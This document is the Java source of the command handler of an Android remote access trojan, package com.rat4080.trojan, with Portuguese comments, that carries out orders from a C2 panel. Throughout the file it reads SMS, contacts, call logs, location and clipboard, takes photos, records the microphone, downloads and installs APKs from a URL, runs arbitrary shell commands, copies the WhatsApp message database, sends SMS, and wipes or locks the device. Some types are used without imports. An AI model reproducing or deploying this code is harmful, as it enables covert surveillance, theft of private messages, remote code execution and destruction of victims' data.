package com.rat4080.trojan;

import android.content.*;
import android.hardware.Camera;
import android.location.*;
import android.media.MediaRecorder;
import android.net.Uri;
import android.os.*;
import android.provider.*;
import android.telephony.SmsManager;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.text.SimpleDateFormat;
import java.util.*;

/**
 * Processa comandos recebidos do painel C2
 */
public class CommandHandler {
    
    private static final String TAG = "Rat4080Cmd";
    
    private Context context;
    private String deviceId;
    private C2Client c2Client;
    
    public CommandHandler(Context context, String deviceId) {
        this.context = context;
        this.deviceId = deviceId;
    }
    
    public void setC2Client(C2Client c2Client) {
        this.c2Client = c2Client;
    }
    
    public void handleCommand(JSONObject command) {
        try {
            int commandId = command.getInt("id");
            String commandName = command.getString("command");
            JSONObject args = new JSONObject(
                command.optString("arguments", "{}")
            );
            
            Log.i(TAG, "Comando recebido: " + commandName);
            
            JSONObject result = new JSONObject();
            result.put("success", true);
            
            switch (commandName) {
                case "get_sms":
                    result.put("data", getSms());
                    break;
                    
                case "get_contacts":
                    result.put("data", getContacts());
                    break;
                    
                case "get_location":
                    result.put("data", getLocation());
                    break;
                    
                case "capture_photo":
                    result.put("data", capturePhoto());
                    break;
                    
                case "record_audio":
                    int duration = args.optInt("duration", 30);
                    result.put("data", recordAudio(duration));
                    break;
                    
                case "download_file":
                    String fileUrl = args.getString("url");
                    result.put("data", downloadAndExecute(fileUrl));
                    break;
                    
                case "run_shell":
                    String cmd = args.getString("cmd");
                    result.put("data", runShellCommand(cmd));
                    break;
                    
                case "list_files":
                    String path = args.optString("path", "/sdcard/");
                    result.put("data", listFiles(path));
                    break;
                    
                case "steal_whatsapp":
                    result.put("data", stealWhatsApp());
                    break;
                    
                case "open_url":
                    String url = args.getString("url");
                    openUrl(url);
                    result.put("data", "URL aberta");
                    break;
                    
                case "send_sms":
                    String to = args.getString("to");
                    String message = args.getString("message");
                    sendSms(to, message);
                    result.put("data", "SMS enviado");
                    break;
                    
                case "wipe_device":
                    wipeDevice();
                    result.put("data", "Dispositivo a ser limpo");
                    break;
                    
                case "get_clipboard":
                    result.put("data", getClipboard());
                    break;
                    
                case "set_clipboard":
                    String text = args.getString("text");
                    setClipboard(text);
                    result.put("data", "Clipboard atualizado");
                    break;
                    
                case "get_installed_apps":
                    result.put("data", getInstalledApps());
                    break;
                    
                case "uninstall_app":
                    String packageName = args.getString("package");
                    uninstallApp(packageName);
                    result.put("data", "App desinstalado");
                    break;
                    
                case "lock_device":
                    lockDevice();
                    result.put("data", "Dispositivo bloqueado");
                    break;
                    
                case "vibrate":
                    int vibrateDuration = args.optInt("duration", 1000);
                    vibrate(vibrateDuration);
                    result.put("data", "Vibração executada");
                    break;
                    
                case "toast_message":
                    String toastText = args.getString("text");
                    showToast(toastText);
                    result.put("data", "Toast mostrado");
                    break;
                    
                case "get_call_logs":
                    result.put("data", getCallLogs());
                    break;
                    
                case "get_browser_history":
                    result.put("data", "Não suportado sem root");
                    break;
                    
                case "change_wallpaper":
                    String wallpaperUrl = args.getString("url");
                    result.put("data", changeWallpaper(wallpaperUrl));
                    break;
                    
                case "screenshot":
                    result.put("data", takeScreenshot());
                    break;
                    
                default:
                    result.put("success", false);
                    result.put("error", "Comando desconhecido: " + commandName);
                    break;
            }
            
            if (c2Client != null) {
                c2Client.sendCommandResult(commandId, result);
            }
            
        } catch (Exception e) {
            Log.e(TAG, "Erro ao processar comando: " + e.getMessage());
            try {
                if (c2Client != null) {
                    c2Client.sendCommandResult(
                        command.getInt("id"),
                        new JSONObject().put("success", false).put("error", e.getMessage())
                    );
                }
            } catch (Exception ex) {
                Log.e(TAG, "Erro ao enviar erro: " + ex.getMessage());
            }
        }
    }
    
    private JSONArray getSms() {
        JSONArray smsList = new JSONArray();
        try {
            Cursor cursor = context.getContentResolver().query(
                Uri.parse("content://sms/inbox"),
                null, null, null, "date DESC LIMIT 100"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject sms = new JSONObject();
                    sms.put("address", cursor.getString(cursor.getColumnIndexOrThrow("address")));
                    sms.put("body", cursor.getString(cursor.getColumnIndexOrThrow("body")));
                    sms.put("date", cursor.getString(cursor.getColumnIndexOrThrow("date")));
                    sms.put("type", cursor.getString(cursor.getColumnIndexOrThrow("type")));
                    smsList.put(sms);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao ler SMS: " + e.getMessage());
        }
        return smsList;
    }
    
    private JSONArray getContacts() {
        JSONArray contactList = new JSONArray();
        try {
            Cursor cursor = context.getContentResolver().query(
                ContactsContract.Contacts.CONTENT_URI,
                null, null, null, null
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String contactId = cursor.getString(
                        cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID)
                    );
                    String name = cursor.getString(
                        cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)
                    );
                    
                    // Obtém números
                    if (Integer.parseInt(cursor.getString(
                        cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)
                    )) > 0) {
                        
                        Cursor phoneCursor = context.getContentResolver().query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{contactId},
                            null
                        );
                        
                        JSONArray phones = new JSONArray();
                        if (phoneCursor != null) {
                            while (phoneCursor.moveToNext()) {
                                phones.put(phoneCursor.getString(
                                    phoneCursor.getColumnIndexOrThrow(
                                        ContactsContract.CommonDataKinds.Phone.NUMBER
                                    )
                                ));
                            }
                            phoneCursor.close();
                        }
                        
                        JSONObject contact = new JSONObject();
                        contact.put("name", name);
                        contact.put("phones", phones);
                        contactList.put(contact);
                    }
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao ler contactos: " + e.getMessage());
        }
        return contactList;
    }
    
    private JSONObject getLocation() {
        JSONObject locationData = new JSONObject();
        try {
            LocationManager locationManager = (LocationManager) 
                context.getSystemService(Context.LOCATION_SERVICE);
            
            Location lastKnown = locationManager.getLastKnownLocation(
                LocationManager.GPS_PROVIDER
            );
            
            if (lastKnown == null) {
                lastKnown = locationManager.getLastKnownLocation(
                    LocationManager.NETWORK_PROVIDER
                );
            }
            
            if (lastKnown != null) {
                locationData.put("latitude", lastKnown.getLatitude());
                locationData.put("longitude", lastKnown.getLongitude());
                locationData.put("accuracy", lastKnown.getAccuracy());
                locationData.put("altitude", lastKnown.getAltitude());
                locationData.put("timestamp", lastKnown.getTime());
            } else {
                locationData.put("error", "Localização não disponível");
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao obter localização: " + e.getMessage());
            try {
                locationData.put("error", e.getMessage());
            } catch (Exception ex) {}
        }
        return locationData;
    }
    
    private String capturePhoto() {
        try {
            // Abre a câmara e captura
            Camera camera = Camera.open();
            Camera.Parameters params = camera.getParameters();
            camera.setParameters(params);
            
            // Captura a imagem
            camera.startPreview();
            Thread.sleep(500);
            
            // Salva a imagem
            File photoFile = new File(
                context.getExternalFilesDir(null),
                "photo_" + System.currentTimeMillis() + ".jpg"
            );
            
            FileOutputStream fos = new FileOutputStream(photoFile);
            camera.takePicture(null, null, (data, cam) -> {
                try {
                    fos.write(data);
                    fos.close();
                } catch (Exception e) {
                    Log.e(TAG, "Erro ao salvar foto: " + e.getMessage());
                }
            });
            
            camera.stopPreview();
            camera.release();
            
            return photoFile.getAbsolutePath();
        } catch (Exception e) {
            return "Erro: " + e.getMessage();
        }
    }
    
    private String recordAudio(int duration) {
        try {
            File audioFile = new File(
                context.getExternalFilesDir(null),
                "audio_" + System.currentTimeMillis() + ".3gp"
            );
            
            MediaRecorder recorder = new MediaRecorder();
            recorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
            recorder.setOutputFile(audioFile.getAbsolutePath());
            
            recorder.prepare();
            recorder.start();
            
            Thread.sleep(duration * 1000);
            
            recorder.stop();
            recorder.release();
            
            return audioFile.getAbsolutePath();
        } catch (Exception e) {
            return "Erro: " + e.getMessage();
        }
    }
    
    private String downloadAndExecute(String fileUrl) {
        try {
            // Descarrega o ficheiro
            URL url = new URL(fileUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");
            
            File apkFile = new File(
                context.getExternalFilesDir(null),
                "downloaded_" + System.currentTimeMillis() + ".apk"
            );
            
            InputStream is = conn.getInputStream();
            FileOutputStream fos = new FileOutputStream(apkFile);
            
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = is.read(buffer)) != -1) {
                fos.write(buffer, 0, bytesRead);
            }
            
            fos.close();
            is.close();
            conn.disconnect();
            
            // Instala o APK
            Intent installIntent = new Intent(Intent.ACTION_VIEW);
            installIntent.setDataAndType(
                Uri.fromFile(apkFile),
                "application/vnd.android.package-archive"
            );
            installIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(installIntent);
            
            return "APK descarregado e instalado: " + apkFile.getAbsolutePath();
        } catch (Exception e) {
            return "Erro: " + e.getMessage();
        }
    }
    
    private String runShellCommand(String command) {
        try {
            Process process = Runtime.getRuntime().exec(new String[]{
                "sh", "-c", command
            });
            
            BufferedReader reader = new BufferedReader(
                new InputStreamReader(process.getInputStream())
            );
            
            StringBuilder output = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                output.append(line).append("\n");
            }
            
            reader.close();
            process.waitFor();
            
            return output.toString();
        } catch (Exception e) {
            return "Erro: " + e.getMessage();
        }
    }
    
    private JSONArray listFiles(String path) {
        JSONArray fileList = new JSONArray();
        try {
            File directory = new File(path);
            File[] files = directory.listFiles();
            
            if (files != null) {
                for (File file : files) {
                    JSONObject fileInfo = new JSONObject();
                    fileInfo.put("name", file.getName());
                    fileInfo.put("path", file.getAbsolutePath());
                    fileInfo.put("size", file.length());
                    fileInfo.put("is_directory", file.isDirectory());
                    fileInfo.put("last_modified", file.lastModified());
                    fileList.put(fileInfo);
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao listar ficheiros: " + e.getMessage());
        }
        return fileList;
    }
    
    private String stealWhatsApp() {
        try {
            File whatsappDb = new File(
                "/data/data/com.whatsapp/databases/msgstore.db"
            );
            
            if (whatsappDb.exists()) {
                // Tenta copiar (requer root)
                File destination = new File(
                    context.getExternalFilesDir(null),
                    "whatsapp_msgstore.db"
                );
                
                FileInputStream fis = new FileInputStream(whatsappDb);
                FileOutputStream fos = new FileOutputStream(destination);
                
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    fos.write(buffer, 0, bytesRead);
                }
                
                fis.close();
                fos.close();
                
                return destination.getAbsolutePath();
            }
            
            return "Base de dados do WhatsApp não acessível (requer root)";
        } catch (Exception e) {
            return "Erro: " + e.getMessage();
        }
    }
    
    private void openUrl(String url) {
        try {
            Intent browserIntent = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            browserIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(browserIntent);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao abrir URL: " + e.getMessage());
        }
    }
    
    private void sendSms(String to, String message) {
        try {
            SmsManager smsManager = SmsManager.getDefault();
            smsManager.sendTextMessage(to, null, message, null, null);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao enviar SMS: " + e.getMessage());
        }
    }
    
    private void wipeDevice() {
        try {
            // Limpa dados da aplicação
            context.getContentResolver().delete(
                Uri.parse("content://sms"),
                null,
                null
            );
            
            // Apaga ficheiros do storage externo
            File externalDir = Environment.getExternalStorageDirectory();
            deleteRecursive(externalDir);
            
            // Bloqueia o dispositivo
            DevicePolicyManager dpm = (DevicePolicyManager) 
                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm != null && dpm.isAdminActive(null)) {
                dpm.wipeData(0);
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao limpar dispositivo: " + e.getMessage());
        }
    }
    
    private void deleteRecursive(File file) {
        if (file.isDirectory()) {
            for (File child : file.listFiles()) {
                deleteRecursive(child);
            }
        }
        file.delete();
    }
    
    private String getClipboard() {
        try {
            ClipboardManager clipboard = (ClipboardManager)
                context.getSystemService(Context.CLIPBOARD_SERVICE);
            
            if (clipboard != null && clipboard.getPrimaryClip() != null) {
                return clipboard.getPrimaryClip().getItemAt(0).getText().toString();
            }
            return "";
        } catch (Exception e) {
            return "Erro: " + e.getMessage();
        }
    }
    
    private void setClipboard(String text) {
        try {
            ClipboardManager clipboard = (ClipboardManager)
                context.getSystemService(Context.CLIPBOARD_SERVICE);
            
            ClipData clip = ClipData.newPlainText("text", text);
            clipboard.setPrimaryClip(clip);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao definir clipboard: " + e.getMessage());
        }
    }
    
    private JSONArray getInstalledApps() {
        JSONArray appList = new JSONArray();
        try {
            List<android.content.pm.PackageInfo> packages = 
                context.getPackageManager().getInstalledPackages(0);
            
            for (android.content.pm.PackageInfo pkg : packages) {
                JSONObject app = new JSONObject();
                app.put("package_name", pkg.packageName);
                app.put("version_name", pkg.versionName);
                app.put("app_name", pkg.applicationInfo.loadLabel(
                    context.getPackageManager()
                ).toString());
                appList.put(app);
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao listar apps: " + e.getMessage());
        }
        return appList;
    }
    
    private void uninstallApp(String packageName) {
        try {
            Intent uninstallIntent = new Intent(
                Intent.ACTION_DELETE,
                Uri.parse("package:" + packageName)
            );
            uninstallIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(uninstallIntent);
        } catch (Exception e) {
            Log.e(TAG, "Erro ao desinstalar: " + e.getMessage());
        }
    }
    
    private void lockDevice() {
        try {
            DevicePolicyManager dpm = (DevicePolicyManager)
                context.getSystemService(Context.DEVICE_POLICY_SERVICE);
            if (dpm != null && dpm.isAdminActive(null)) {
                dpm.lockNow();
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao bloquear: " + e.getMessage());
        }
    }
    
    private void vibrate(int duration) {
        try {
            android.os.Vibrator vibrator = (android.os.Vibrator)
                context.getSystemService(Context.VIBRATOR_SERVICE);
            if (vibrator != null) {
                vibrator.vibrate(duration);
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao vibrar: " + e.getMessage());
        }
    }
    
    private void showToast(String text) {
        try {
            android.os.Handler handler = new android.os.Handler(Looper.getMainLooper());
            handler.post(() -> {
                android.widget.Toast.makeText(context, text, 
                    android.widget.Toast.LENGTH_LONG).show();
            });
        } catch (Exception e) {
            Log.e(TAG, "Erro ao mostrar toast: " + e.getMessage());
        }
    }
    
    private JSONArray getCallLogs() {
        JSONArray callList = new JSONArray();
        try {
            Cursor cursor = context.getContentResolver().query(
                CallLog.Calls.CONTENT_URI,
                null, null, null,
                CallLog.Calls.DATE + " DESC LIMIT 100"
            );
            
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject call = new JSONObject();
                    call.put("number", cursor.getString(
                        cursor.getColumnIndexOrThrow(CallLog.Calls.NUMBER)
                    ));
                    call.put("type", cursor.getString(
                        cursor.getColumnIndexOrThrow(CallLog.Calls.TYPE)
                    ));
                    call.put("duration", cursor.getString(
                        cursor.getColumnIndexOrThrow(CallLog.Calls.DURATION)
                    ));
                    call.put("date", cursor.getString(
                        cursor.getColumnIndexOrThrow(CallLog.Calls.DATE)
                    ));
                    callList.put(call);
                }
                cursor.close();
            }
        } catch (Exception e) {
            Log.e(TAG, "Erro ao ler chamadas: " + e.getMessage());
        }
        return callList;
    }
    
    private String changeWallpaper(String wallpaperUrl) {
        try {
            URL url = new URL(wallpaperUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            InputStream is = conn.getInputStream();
            
            android.graphics.Bitmap bitmap = 
                android.graphics.BitmapFactory.decodeStream(is);
            
            android.app.WallpaperManager wallpaperManager = 
                android.app.WallpaperManager.getInstance(context);
            
            wallpaperManager.setBitmap(bitmap);
            
            is.close();
            conn.disconnect();
            
            return "Wallpaper alterado";
        } catch (Exception e) {
            return "Erro: " + e.getMessage();
        }
    }
    
    private String takeScreenshot() {
        try {
            // Screenshot requer MediaProjection API (Android 5+)
            // Implementação requer foreground service com MediaProjection
            return "Screenshot requer configuração adicional de MediaProjection";
        } catch (Exception e) {
            return "Erro: " + e.getMessage();
        }
    }
}
